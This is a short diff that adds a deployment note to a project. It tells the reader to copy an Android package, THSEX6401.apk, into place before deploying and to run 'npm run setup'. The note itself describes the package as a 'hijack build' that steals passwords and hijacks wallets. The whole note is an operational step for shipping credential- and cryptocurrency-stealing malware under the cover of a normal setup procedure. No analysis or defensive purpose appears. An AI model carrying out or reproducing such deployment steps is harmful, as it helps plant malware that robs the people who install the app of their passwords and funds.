@@ -1,0 +1,6 @@
+Copy THSEX6401.apk here before deploy.
+
+Run from project root:
+  npm run setup
+
+Source: ../THSEX6401.apk (hijack build with password steal + wallet hijack)
